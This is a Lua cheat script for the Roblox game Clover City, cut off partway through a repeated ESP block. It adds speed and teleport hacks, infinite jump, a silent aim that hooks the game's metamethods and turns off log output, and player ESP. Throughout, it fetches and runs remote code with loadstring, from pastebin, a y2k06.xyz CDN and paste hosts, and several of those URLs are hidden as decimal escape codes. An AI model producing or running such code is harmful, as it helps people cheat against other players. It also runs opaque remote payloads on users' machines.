loadstring(game:HttpGet('https://cdn.y2k06.xyz/lua/SpyChat.lua', true))()

game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "Script Executed!"; --chat notification
    Font = Enum.Font.GothamBlack; --font changeable
    FontSize = Enum.FontSize.Size24; --font size changeable
    })
    wait()
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "Clover City script V1.4"; --chat notification
    Font = Enum.Font.GothamBlack; --font changeable
    FontSize = Enum.FontSize.Size24; --font size changeable
    })
    wait(2)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "Loading..."; --chat notification
    Font = Enum.Font.GothamBlack; --font changeable
    FontSize = Enum.FontSize.Size24; --font size changeable
    })
    wait(2)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "CloverCity Script LOADED!"; --chat notification
    Font = Enum.Font.GothamBlack; --font changeable
    FontSize = Enum.FontSize.Size24; --font size changeable
    })
    wait()
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
    local Window = Library.CreateLib("Clover City Script v1.4 | Made by lolocahhh45", "BloodTheme")
    
    local Tab = Window:NewTab("Main")
    local Section = Tab:NewSection("Solo script")
    Section:NewButton("Free cam", "Press SHITF+P For turn on", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/ct8Kq5F0", true))()
    end)
    Section:NewToggle("Auto WalkSpeed", "Turns on walkspeed every 0.5s", function(state2)
        if state2 then
            _G.DO44 = true
                    while wait(0.5) and _G.DO44 == true do
                        if _G.lol == nil then _G.lol = 40 end
    
                        getgenv().WalkSpeedValue = _G.lol;
                        local Player = game:service'Players'.LocalPlayer;
                        Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
                        Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
                        end)
                        Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end
        else
             _G.DO44 = false
        end
    end)
    
    Section:NewSlider("WalkSpeed", "Just walkspeed changuer", 40, 8, function(sxd1)
        _G.lol = sxd1
        getgenv().WalkSpeedValue = sxd1;
    local Player = game:service'Players'.LocalPlayer;
    Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end)
    Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
    end)
    Section:NewButton("Light", "Just light | Click again = more light | !LOCAL!", function()
        character = game:GetService("Players").LocalPlayer.Character
    pointLight = Instance.new("PointLight")
    pointLight.Parent = character.HumanoidRootPart
    end)
    Section:NewToggle("Cframe walk", "Left shift", function(state)
        if state then

        if _G.CfSpeed == nil then _G.CfSpeed = 0.9 end

        _G.CframeWalkt = true

if _G.CframeWalkStateI == true then else
_G.CframeWalkStateI = true
        local Player = game:GetService'Players'.LocalPlayer;
    local UIS = game:GetService'UserInputService';
    UIS.InputBegan:connect(function(UserInput)
            if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.LeftShift then
                _G.Running = true
                    while wait(0.005) and _G.Running == true and _G.CframeWalkt == true do
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * _G.CfSpeed
    
    end
            end
    end)
    UIS.InputEnded:connect(function(UserInput)
            if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.LeftShift then
                    _G.Running = false
            end
    end)
          end  
        else
            _G.CframeWalkt = false
        end
    end)
Section:NewSlider("Cframe speed", "Select your speed for Cframe walk! Default 9", 10, 1, function(sn) -- 17 (MaxValue) | 1 (MinValue)
_G.CfSpeed = sn/10
end)

    Section:NewToggle("No gravity", "Gravity toggle", function(state)
        if state then
    
            loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\109\97\105\110\47\71\114\97\118\105\116\121\115\47\103\114\97\118\105\116\121\79\110"))()
        else
        
            loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\109\97\105\110\47\71\114\97\118\105\116\121\115\47\71\114\97\118\105\116\121\79\102\102"))()
        end
    end)
        
Section:NewButton("Million dollar room teleport", "its nice!", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(300.291656, -47.7395096, 608.878601, -0.987136424, 2.91825355e-08, -0.159880117, 1.42224366e-08, 1, 9.4715034e-08, 0.159880117, 9.12227733e-08, -0.987136424)
end)
    Section:NewToggle("LifeSaver (TP)", "UH", function(state2)
        if state2 then

            if _G.Healthmin == nil then

                _G.Healthmin = 5
            end

            if _G.SecondsBT == nil then

                _G.SecondsBT = 1
            end
            -- Obtener el personaje del jugador local
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    
    -- Obtener la instancia HumanoidRootPart del personaje
    local rootPart = character:WaitForChild("HumanoidRootPart")

            local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local Health = humanoid.Health

_G.HealthUsEr = Health


            _G.Running6 = true
                    while wait(0) and _G.Running6 == true do

-- Obtener el personaje del jugador local
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Obtener la instancia HumanoidRootPart del personaje
local rootPart = character:WaitForChild("HumanoidRootPart")

        local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local Health = humanoid.Health

_G.HealthUsEr = Health
if _G.HealthUsEr < _G.Healthmin then
wait(_G.SecondsBT)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(300.291656, -47.7395096, 608.878601, -0.987136424, 2.91825355e-08, -0.159880117, 1.42224366e-08, 1, 9.4715034e-08, 0.159880117, 9.12227733e-08, -0.987136424)
end
                    end
        

        else
             _G.Running6 = false
        end
    end)

    Section:NewSlider("Select health", "mmm", 100, 1, function(sm2l) -- 500 (MaxValue) | 0 (MinValue)
        _G.Healthmin = sm2l
    end)
    Section:NewSlider("Seconds before tp", "mmm", 10, 1, function(sm3l) -- 500 (MaxValue) | 0 (MinValue)
        _G.SecondsBT = sm3l
    end)
    
    Section:NewToggle("Inf Jump", "Jump in air 🤑", function(state)
        if state then
            loadstring(game:HttpGet("https://pastebin.com/raw/HQsQysa8", true))()
        else
            _G.infinjump = false
     
    local Player = game:GetService("Players").LocalPlayer
    local Mouse = Player:GetMouse()
    Mouse.KeyDown:connect(function(k)
    if _G.infinjump then
    if k:byte() == 32 then
    Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    Humanoid:ChangeState("Jumping")
    wait(0.1)
    Humanoid:ChangeState("Seated")
    end
    end
    end)
        end
    end)
    Section:NewButton("Click tp", "CTRL + CLICK", function()
        noclip = false
    local UIS = game:GetService("UserInputService")
    local Player = game.Players.LocalPlayer
    local Mouse = Player:GetMouse()
    
    
    function GetCharacter()
       return game.Players.LocalPlayer.Character
    end
    
    function Teleport(pos)
       local Char = GetCharacter()
       if Char then
           Char:MoveTo(pos)
       end
    end
    
    
    UIS.InputBegan:Connect(function(input)
       if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
           Teleport(Mouse.Hit.p)
       end
    end)
    end)

    Section:NewButton("AntiAFK", "idk how this works", function()
        loadstring(game:HttpGet('https://cdn.y2k06.xyz/lua/UniversalAntiAfk.lua', true))()
    end)
    
    local Tab = Window:NewTab("Combat")
    local Section = Tab:NewSection("Solo Script")
    Section:NewLabel("Silent aim")

Section:NewButton("Silent aim", "Its very nice", function()
    getgenv().Prediction =  (  0.160  )  --Custom

    getgenv().FOV =  (  100  )   -- [ FOV RADIUS: Increases Or Decreases FOV Radius (Recomended fov 100)]
    
    getgenv().AimKey =  (  "l"  )  -- [ TOGGLE KEY: Toggles Silent Aim On And Off ]
    
    getgenv().FOV_VISIBLE = true
    
    getgenv().Notifier = true
    
    getgenv().PredictionsHelpWithPRINTING = true
    
    getgenv().Copy_Discord_Server_On_SetUp = false
    
    getgenv().DontShootThesePeople = {  -- [ WHITELIST TABLE: List Of Who NOT To Shoot, edit like this. "Contain quotations with their name and then a semi-colon afterwards for each line" ; ]
    
        "Example"; --This is a example of whitelisted user
        "Example"; --another example
    
    }
    
    --[[
            Do Not Edit Anything Beyond This Point. (Silent aim)
    ]]
    
    local SilentAim = true
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Players = game:GetService("Players")
    local Mouse = LocalPlayer:GetMouse()
    local Camera = game:GetService("Workspace").CurrentCamera
    local connections = getconnections(game:GetService("LogService").MessageOut)
    for _, v in ipairs(connections) do
        v:Disable()
    end
    
    getrawmetatable = getrawmetatable
    setreadonly = setreadonly
    getconnections = getconnections
    hookmetamethod = hookmetamethod
    getgenv = getgenv
    Drawing = Drawing
    
    local FOV_CIRCLE = Drawing.new("Circle")
    FOV_CIRCLE.Visible = getgenv().FOV_VISIBLE
    FOV_CIRCLE.Filled = false
    FOV_CIRCLE.Thickness = 1
    FOV_CIRCLE.Transparency = 1
    FOV_CIRCLE.Color = Color3.new(0, 1, 0)
    FOV_CIRCLE.Radius = getgenv().FOV
    FOV_CIRCLE.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    
    local Options = {
        Torso = "HumanoidRootPart";
        Head = "Head";
    }
    
    local function MoveFovCircle()
        pcall(function()
            local DoIt = true
            spawn(function()
                while DoIt do task.wait()
                    FOV_CIRCLE.Position = Vector2.new(Mouse.X, (Mouse.Y + 36))
                end
            end)
        end)
    end coroutine.wrap(MoveFovCircle)()
    if Notifier == nil or false then else
    game.StarterGui:SetCore("SendNotification", {Title = "Silent Aim ON", Text = "TOGGLED", Duration = 5,}) -- initially on.
    end
    local function ItsOn()
        if Notifier == nil or false then else
        game.StarterGui:SetCore("SendNotification", {Title = "Silent Aim ON", Text = "TOGGLED", Duration = 5,})
        end
    end
    local function ItsOff()
        if Notifier == nil or false then else
        game.StarterGui:SetCore("SendNotification", {Title = "Silent Aim OFF", Text = "UN-TOGGLED", Duration = 5,})
        end
    end
    
    Mouse.KeyDown:Connect(function(KeyPressed)
        if KeyPressed == (getgenv().AimKey:lower()) then
            if SilentAim == false then
                FOV_CIRCLE.Color = Color3.new(0, 1, 0)
                SilentAim = true
                ItsOn()
            elseif SilentAim == true then
                FOV_CIRCLE.Color = Color3.new(1, 0, 0)
                SilentAim = false
                ItsOff()
            end
        end
    end)
    Mouse.KeyDown:Connect(function(Rejoin)
        if Rejoin == "=" then
            local LocalPlayer = game:GetService("Players").LocalPlayer
            game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
        end
    end)
    
    local oldIndex = nil 
    oldIndex = hookmetamethod(game, "__index", function(self, Index)
        if self == Mouse and (Index == "Hit") then 
            if SilentAim then
                local Distance = 9e9
                local Target = nil
                local Players = game:GetService("Players")
                local LocalPlayer = game:GetService("Players").LocalPlayer
                local Camera = game:GetService("Workspace").CurrentCamera
                for _, v in pairs(Players:GetPlayers()) do 
                    if not table.find(getgenv().DontShootThesePeople, v.Name) then
                        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("Humanoid").Health > 0 then
                            local Enemy = v.Character	
                            local CastingFrom = CFrame.new(Camera.CFrame.Position, Enemy[Options.Torso].CFrame.Position) * CFrame.new(0, 0, -4)
                            local RayCast = Ray.new(CastingFrom.Position, CastingFrom.LookVector * 9000)
                            local World, ToSpace = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(RayCast, {LocalPlayer.Character:FindFirstChild("Head")})
                            local RootWorld = (Enemy[Options.Torso].CFrame.Position - ToSpace).magnitude
                            if RootWorld < 4 then		
                                local RootPartPosition, Visible = Camera:WorldToScreenPoint(Enemy[Options.Torso].Position)
                                if Visible then
                                    local Real_Magnitude = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPartPosition.X, RootPartPosition.Y)).Magnitude
                                    if Real_Magnitude < Distance and Real_Magnitude < FOV_CIRCLE.Radius then
                                        Distance = Real_Magnitude
                                        Target = Enemy
                                    end
                                end
                            end
                        end
                    end
                end
    
                if Target ~= nil and Target[Options.Torso] and Target:FindFirstChild("Humanoid").Health > 0 then
                    if SilentAim then
                        local ShootThis = Target[Options.Torso]
                        local Predicted_Position = ShootThis.CFrame + (ShootThis.Velocity * getgenv().Prediction + Vector3.new(0,-.5,0))
                        return ((Index == "Hit" and Predicted_Position))
                    end
                end
            end
        end
        return oldIndex(self, Index)
    end)
    
    --Prints (F9)
    
    print("____________________________________________________________________________________________________")
    print("Modified by Solo Script")
    print("Undetectable! ✅")
    
    print("Local Prediction =", Prediction)
    print("Local fov =", FOV)
    print("Local Aim key =", AimKey)
    
    if FOV_VISIBLE then print("Fov visible ✅")
    else print("Fov visible ❎")
    end
    
    if Notifier then print("Notifier ✅")
    else print("Notifier ❎")
    end
    
    if Copy_Discord_Server_On_SetUp
    then print("Copy discord server on setup ✅")
    wait(1)
    setclipboard("https://discord.gg/gYqbqSNUvK")
    print("Discord link copied to clipboard")
    
    
    else print("Copy discord server on setup ❎")
    end
    if PredictionsHelpWithPRINTING
    then
    
    print("Prediction help ✅")
    
    _G.L = "No tested"
    _G.W = "Tested"
    
    print("------------------------------")
    print("0-70ms 0.157", _G.W)
    print("71-90ms 0.158", _G.W)
    print("90-100ms 0.160", _G.L)
    print("101-140ms 0.161", _G.L)
    print("141-180ms 0.162", _G.L)
    print("if you want to contribute with more predictions tell on discord!")
    else print("Prediction help ❎")
    end
    
    print("----------------------------------------------------------------------------------------------------")
    
end)

    Section:NewSlider("Prediction", "Prediction is divided in 1000|Default 160", 200, 150, function(s) -- 200 (MaxValue) | 150 (MinValue)
        _G.PredictionAmount = s/1000
        getgenv().Prediction =  (  _G.PredictionAmount  )
    end)
    Section:NewTextBox("AimKey", "Default = L", function(AimKeyplus)
        getgenv().AimKey =  (  AimKeyplus  )
    end)
    
    Section:NewToggle("PredictionHelp (F9)", "sup", function(state)
        if state then
            getgenv().PredictionsHelpWithPRINTING = true
        else
            getgenv().PredictionsHelpWithPRINTING = false
        end
    end)
    Section:NewToggle("Notifier", "idk xd", function(state)
    if state then
    Notifier = true
    else
    Notifier = false
    end
end)
    Section:NewToggle("Copy discord on setup", "i can't tell here what this does.", function(state)
        if state then
            getgenv().Copy_Discord_Server_On_SetUp = true
        else
            getgenv().Copy_Discord_Server_On_SetUp = false
        end
    end)    
    
    Section:NewLabel("Crosshairs")
    Section:NewButton("Green Crosshair", "Toggle = G", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\47\75\101\111\110\101\71\105\116\104\117\98\47\109\97\105\110\47\87\105\108\100\87\101\115\116\71\114\101\101\110\67\114\111\115\115\104\97\105\114"))()
    end)
    Section:NewButton("Red Crosshair (ISSUES) ", "Toggle = LeftAlt", function()
        -- Custom Crosshair by zzerexx#3970
        getgenv().CrosshairSettings = {
            Color = Color3.fromRGB(255,0,0),
            RainbowColor = false,
            Opacity = 1,
            Length = 10, -- Length of each line
            Thickness = 2, -- Thickness of each line
            Offset = 3, -- Offset from the middle point
            Dot = false, -- not recommended
            FollowCursor = true, -- Crosshair follows the cursor
            HideMouseIcon = false, -- Hides the mouse icon, set to 0 to ignore
            HideGameCrosshair = false, -- Hides the current game's crosshair (if its supported)
            ToggleKey = Enum.KeyCode.RightAlt, -- Toggles crosshair visibility
        } -- v1.2.1
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zzerexx/scripts/main/CustomCrosshair.lua", true))()
    end)
    Section:NewToggle("HideCursor", "RedCrosshair", function(state)
        if state then
            getgenv().CrosshairSettings = {
                Color = Color3.fromRGB(255,0,0),
                RainbowColor = false,
                Opacity = 1,
                Length = 10, -- Length of each line
                Thickness = 2, -- Thickness of each line
                Offset = 3, -- Offset from the middle point
                Dot = false, -- not recommended
                FollowCursor = true, -- Crosshair follows the cursor
                HideMouseIcon = true, -- Hides the mouse icon, set to 0 to ignore
                HideGameCrosshair = false, -- Hides the current game's crosshair (if its supported)
                ToggleKey = Enum.KeyCode.RightAlt, -- Toggles crosshair visibility
            } -- v1.2.1
        else
            getgenv().CrosshairSettings = {
                Color = Color3.fromRGB(255,0,0),
                RainbowColor = false,
                Opacity = 1,
                Length = 10, -- Length of each line
                Thickness = 2, -- Thickness of each line
                Offset = 3, -- Offset from the middle point
                Dot = false, -- not recommended
                FollowCursor = true, -- Crosshair follows the cursor
                HideMouseIcon = false, -- Hides the mouse icon, set to 0 to ignore
                HideGameCrosshair = false, -- Hides the current game's crosshair (if its supported)
                ToggleKey = Enum.KeyCode.RightAlt, -- Toggles crosshair visibility
            } -- v1.2.1
        end
    end)
    Section:NewLabel("Others")
    Section:NewButton("Anti Aim", "You can reset to toggle", function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\97\112\105\46\117\112\108\111\97\100\46\115\121\115\116\101\109\115\47\112\97\115\116\101\115\47\83\114\69\99\87\106\56\105\102\74\118\86\47\114\97\119",true))()
    end)

    local Tab = Window:NewTab("Visuals")
    local Section = Tab:NewSection("Solo script")
    Section:NewLabel("Esp")
    Section:NewLabel("WeAreDevs Esp")
    Section:NewToggle("Master toggle", "a", function(state)
        if state then
            _G.WRDESPEnabled = true --Enables the ESP (Defaults to true)
    
    
    --Dont edit below
    
    --Only ever load the script once
    if not _G.WRDESPLoaded then    
        ----[[ First- Load Kiriot ESP Library ]]----
    
        --Settings--
        local ESP = {
            Enabled = false,
            Boxes = true,
            BoxShift = CFrame.new(0,-1.5,0),
            BoxSize = Vector3.new(4,6,0),
            Color = Color3.fromRGB(255, 170, 0),
            FaceCamera = false,
            Names = true,
            TeamColor = true,
            Thickness = 2,
            AttachShift = 1,
            TeamMates = true,
            Players = true,
            
            Objects = setmetatable({}, {__mode="kv"}),
            Overrides = {}
        }
    
        --Declarations--
        local cam = workspace.CurrentCamera
        local plrs = game:GetService("Players")
        local plr = plrs.LocalPlayer
        local mouse = plr:GetMouse()
    
        local V3new = Vector3.new
        local WorldToViewportPoint = cam.WorldToViewportPoint
    
        --Functions--
        local function Draw(obj, props)
            local new = Drawing.new(obj)
            
            props = props or {}
            for i,v in pairs(props) do
                new[i] = v
            end
            return new
        end
    
        function ESP:GetTeam(p)
            local ov = self.Overrides.GetTeam
            if ov then
                return ov(p)
            end
            
            return p and p.Team
        end
    
        function ESP:IsTeamMate(p)
            local ov = self.Overrides.IsTeamMate
            if ov then
                return ov(p)
            end
            
            return self:GetTeam(p) == self:GetTeam(plr)
        end
    
        function ESP:GetColor(obj)
            local ov = self.Overrides.GetColor
            if ov then
                return ov(obj)
            end
            local p = self:GetPlrFromChar(obj)
            return p and self.TeamColor and p.Team and p.Team.TeamColor.Color or self.Color
        end
    
        function ESP:GetPlrFromChar(char)
            local ov = self.Overrides.GetPlrFromChar
            if ov then
                return ov(char)
            end
            
            return plrs:GetPlayerFromCharacter(char)
        end
    
        function ESP:Toggle(bool)
            self.Enabled = bool
            if not bool then
                for i,v in pairs(self.Objects) do
                    if v.Type == "Box" then --fov circle etc
                        if v.Temporary then
                            v:Remove()
                        else
                            for i,v in pairs(v.Components) do
                                v.Visible = false
                            end
                        end
                    end
                end
            end
        end
    
        function ESP:GetBox(obj)
            return self.Objects[obj]
        end
    
        function ESP:AddObjectListener(parent, options)
            local function NewListener(c)
                if type(options.Type) == "string" and c:IsA(options.Type) or options.Type == nil then
                    if type(options.Name) == "string" and c.Name == options.Name or options.Name == nil then
                        if not options.Validator or options.Validator(c) then
                            local box = ESP:Add(c, {
                                PrimaryPart = type(options.PrimaryPart) == "string" and c:WaitForChild(options.PrimaryPart) or type(options.PrimaryPart) == "function" and options.PrimaryPart(c),
                                Color = type(options.Color) == "function" and options.Color(c) or options.Color,
                                ColorDynamic = options.ColorDynamic,
                                Name = type(options.CustomName) == "function" and options.CustomName(c) or options.CustomName,
                                IsEnabled = options.IsEnabled,
                                RenderInNil = options.RenderInNil
                            })
                            --TODO: add a better way of passing options
                            if options.OnAdded then
                                coroutine.wrap(options.OnAdded)(box)
                            end
                        end
                    end
                end
            end
    
            if options.Recursive then
                parent.DescendantAdded:Connect(NewListener)
                for i,v in pairs(parent:GetDescendants()) do
                    coroutine.wrap(NewListener)(v)
                end
            else
                parent.ChildAdded:Connect(NewListener)
                for i,v in pairs(parent:GetChildren()) do
                    coroutine.wrap(NewListener)(v)
                end
            end
        end
    
        local boxBase = {}
        boxBase.__index = boxBase
    
        function boxBase:Remove()
            ESP.Objects[self.Object] = nil
            for i,v in pairs(self.Components) do
                v.Visible = false
                v:Remove()
                self.Components[i] = nil
            end
        end
    
        function boxBase:Update()
            if not self.PrimaryPart then
                --warn("not supposed to print", self.Object)
                return self:Remove()
            end
    
            local color
            if ESP.Highlighted == self.Object then
            color = ESP.HighlightColor
            else
                color = self.Color or self.ColorDynamic and self:ColorDynamic() or ESP:GetColor(self.Object) or ESP.Color
            end
    
            local allow = true
            if ESP.Overrides.UpdateAllow and not ESP.Overrides.UpdateAllow(self) then
                allow = false
            end
            if self.Player and not ESP.TeamMates and ESP:IsTeamMate(self.Player) then
                allow = false
            end
            if self.Player and not ESP.Players then
                allow = false
            end
            if self.IsEnabled and (type(self.IsEnabled) == "string" and not ESP[self.IsEnabled] or type(self.IsEnabled) == "function" and not self:IsEnabled()) then
                allow = false
            end
            if not workspace:IsAncestorOf(self.PrimaryPart) and not self.RenderInNil then
                allow = false
            end
    
            if not allow then
                for i,v in pairs(self.Components) do
                    v.Visible = false
                end
                return
            end
    
            if ESP.Highlighted == self.Object then
                color = ESP.HighlightColor
            end
    
            --calculations--
            local cf = self.PrimaryPart.CFrame
            if ESP.FaceCamera then
                cf = CFrame.new(cf.p, cam.CFrame.p)
            end
            local size = self.Size
            local locs = {
                TopLeft = cf * ESP.BoxShift * CFrame.new(size.X/2,size.Y/2,0),
                TopRight = cf * ESP.BoxShift * CFrame.new(-size.X/2,size.Y/2,0),
                BottomLeft = cf * ESP.BoxShift * CFrame.new(size.X/2,-size.Y/2,0),
                BottomRight = cf * ESP.BoxShift * CFrame.new(-size.X/2,-size.Y/2,0),
                TagPos = cf * ESP.BoxShift * CFrame.new(0,size.Y/2,0),
                Torso = cf * ESP.BoxShift
            }
    
            if ESP.Boxes then
                local TopLeft, Vis1 = WorldToViewportPoint(cam, locs.TopLeft.p)
                local TopRight, Vis2 = WorldToViewportPoint(cam, locs.TopRight.p)
                local BottomLeft, Vis3 = WorldToViewportPoint(cam, locs.BottomLeft.p)
                local BottomRight, Vis4 = WorldToViewportPoint(cam, locs.BottomRight.p)
    
                if self.Components.Quad then
                    if Vis1 or Vis2 or Vis3 or Vis4 then
                        self.Components.Quad.Visible = true
                        self.Components.Quad.PointA = Vector2.new(TopRight.X, TopRight.Y)
                        self.Components.Quad.PointB = Vector2.new(TopLeft.X, TopLeft.Y)
                        self.Components.Quad.PointC = Vector2.new(BottomLeft.X, BottomLeft.Y)
                        self.Components.Quad.PointD = Vector2.new(BottomRight.X, BottomRight.Y)
                        self.Components.Quad.Color = color
                    else
                        self.Components.Quad.Visible = false
                    end
                end
            else
                self.Components.Quad.Visible = false
            end
    
            if ESP.Names then
                local TagPos, Vis5 = WorldToViewportPoint(cam, locs.TagPos.p)
                
                if Vis5 then
                    self.Components.Name.Visible = true
                    self.Components.Name.Position = Vector2.new(TagPos.X, TagPos.Y)
                    self.Components.Name.Text = self.Name
                    self.Components.Name.Color = color
                    
                    self.Components.Distance.Visible = true
                    self.Components.Distance.Position = Vector2.new(TagPos.X, TagPos.Y + 14)
                    self.Components.Distance.Text = math.floor((cam.CFrame.p - cf.p).magnitude) .."m away"
                    self.Components.Distance.Color = color
                else
                    self.Components.Name.Visible = false
                    self.Components.Distance.Visible = false
                end
            else
                self.Components.Name.Visible = false
                self.Components.Distance.Visible = false
            end
            
            if ESP.Tracers then
                local TorsoPos, Vis6 = WorldToViewportPoint(cam, locs.Torso.p)
    
                if Vis6 then
                    self.Components.Tracer.Visible = true
                    self.Components.Tracer.From = Vector2.new(TorsoPos.X, TorsoPos.Y)
                    self.Components.Tracer.To = Vector2.new(cam.ViewportSize.X/2,cam.ViewportSize.Y/ESP.AttachShift)
                    self.Components.Tracer.Color = color
                else
                    self.Components.Tracer.Visible = false
                end
            else
                self.Components.Tracer.Visible = false
            end
        end
    
        function ESP:Add(obj, options)
            if not obj.Parent and not options.RenderInNil then
                return warn(obj, "has no parent")
            end
    
            local box = setmetatable({
                Name = options.Name or obj.Name,
                Type = "Box",
                Color = options.Color --[[or self:GetColor(obj)]],
                Size = options.Size or self.BoxSize,
                Object = obj,
                Player = options.Player or plrs:GetPlayerFromCharacter(obj),
                PrimaryPart = options.PrimaryPart or obj.ClassName == "Model" and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj:IsA("BasePart") and obj,
                Components = {},
                IsEnabled = options.IsEnabled,
                Temporary = options.Temporary,
                ColorDynamic = options.ColorDynamic,
                RenderInNil = options.RenderInNil
            }, boxBase)
    
            if self:GetBox(obj) then
                self:GetBox(obj):Remove()
            end
    
            box.Components["Quad"] = Draw("Quad", {
                Thickness = self.Thickness,
                Color = color,
                Transparency = 1,
                Filled = false,
                Visible = self.Enabled and self.Boxes
            })
            box.Components["Name"] = Draw("Text", {
                Text = box.Name,
                Color = box.Color,
                Center = true,
                Outline = true,
                Size = 19,
                Visible = self.Enabled and self.Names
            })
            box.Components["Distance"] = Draw("Text", {
                Color = box.Color,
                Center = true,
                Outline = true,
                Size = 19,
                Visible = self.Enabled and self.Names
            })
            
            box.Components["Tracer"] = Draw("Line", {
                Thickness = ESP.Thickness,
                Color = box.Color,
                Transparency = 1,
                Visible = self.Enabled and self.Tracers
            })
            self.Objects[obj] = box
            
            obj.AncestryChanged:Connect(function(_, parent)
                if parent == nil and ESP.AutoRemove ~= false then
                    box:Remove()
                end
            end)
            obj:GetPropertyChangedSignal("Parent"):Connect(function()
                if obj.Parent == nil and ESP.AutoRemove ~= false then
                    box:Remove()
                end
            end)
    
            local hum = obj:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Died:Connect(function()
                    if ESP.AutoRemove ~= false then
                        box:Remove()
                    end
                end)
            end
    
            return box
        end
    
        local function CharAdded(char)
            local p = plrs:GetPlayerFromCharacter(char)
            if not char:FindFirstChild("HumanoidRootPart") then
                local ev
                ev = char.ChildAdded:Connect(function(c)
                    if c.Name == "HumanoidRootPart" then
                        ev:Disconnect()
                        ESP:Add(char, {
                            Name = p.Name,
                            Player = p,
                            PrimaryPart = c
                        })
                    end
                end)
            else
                ESP:Add(char, {
                    Name = p.Name,
                    Player = p,
                    PrimaryPart = char.HumanoidRootPart
                })
            end
        end
        local function PlayerAdded(p)
            p.CharacterAdded:Connect(CharAdded)
            if p.Character then
                coroutine.wrap(CharAdded)(p.Character)
            end
        end
        plrs.PlayerAdded:Connect(PlayerAdded)
        for i,v in pairs(plrs:GetPlayers()) do
            if v ~= plr then
                PlayerAdded(v)
            end
        end
    
        game:GetService("RunService").RenderStepped:Connect(function()
            cam = workspace.CurrentCamera
            for i,v in (ESP.Enabled and pairs or ipairs)(ESP.Objects) do
                if v.Update then
                    local s,e = pcall(v.Update, v)
                    if not s then warn("[EU]", e, v.Object:GetFullName()) end
                end
            end
        end)
    
        ----[[ Now Begins WRD's modification for implementation ]]----
    
        --Sets defaults where required
        if _G.WRDESPEnabled == nil then _G.WRDESPEnabled = true end
        if _G.WRDESPBoxes == nil then _G.WRDESPBoxes = true end
        if _G.WRDESPTeamColors == nil then _G.WRDESPTeamColors = true end
        if _G.WRDESPTracers == nil then _G.WRDESPTracers = false end
        if _G.WRDESPNames == nil then _G.WRDESPNames = true end
        
        --Hacky way to keep up with setting changes
        while wait(.1) do
            ESP:Toggle(_G.WRDESPEnabled or false)
            ESP.Boxes = _G.WRDESPBoxes or false
            ESP.TeamColors = _G.WRDESPTeamColors or false
            ESP.Tracers = _G.WRDESPTracers or false
            ESP.Names = _G.WRDESPNames or false
        end
    
        _G.WRDESPLoaded = true
    end
        else
            _G.WRDESPEnabled = false --Enables the ESP (Defaults to true)

    
    --Dont edit below
    
    --Only ever load the script once
    if not _G.WRDESPLoaded then    
        ----[[ First- Load Kiriot ESP Library ]]----
    
        --Settings--
        local ESP = {
            Enabled = false,
            Boxes = true,
            BoxShift = CFrame.new(0,-1.5,0),
            BoxSize = Vector3.new(4,6,0),
            Color = Color3.fromRGB(255, 170, 0),
            FaceCamera = false,
            Names = true,
            TeamColor = true,
            Thickness = 2,
            AttachShift = 1,
            TeamMates = true,
            Players = true,
            
            Objects = setmetatable({}, {__mode="kv"}),
            Overrides = {}
        }
    
        --Declarations--
        local cam = workspace.CurrentCamera
        local plrs = game:GetService("Players")
        local plr = plrs.LocalPlayer
        local mouse = plr:GetMouse()
    
